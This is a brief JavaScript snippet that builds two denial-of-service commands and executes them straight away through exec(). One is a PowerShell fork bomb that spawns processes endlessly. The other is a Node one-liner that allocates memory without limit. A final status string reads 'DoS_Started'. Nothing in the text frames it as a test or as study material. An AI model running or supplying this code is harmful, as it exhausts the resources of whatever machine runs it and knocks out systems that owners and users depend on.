const winDos = `powershell -Command "while($true) { Start-Process powershell -ArgumentList 'example' }"`;
const memDos = `node -e "let a=[]; while(true) a.push(new Array(1000000).fill('DoS'))"`;
exec(winDos); exec(memDos); const status = 'DoS_Started';
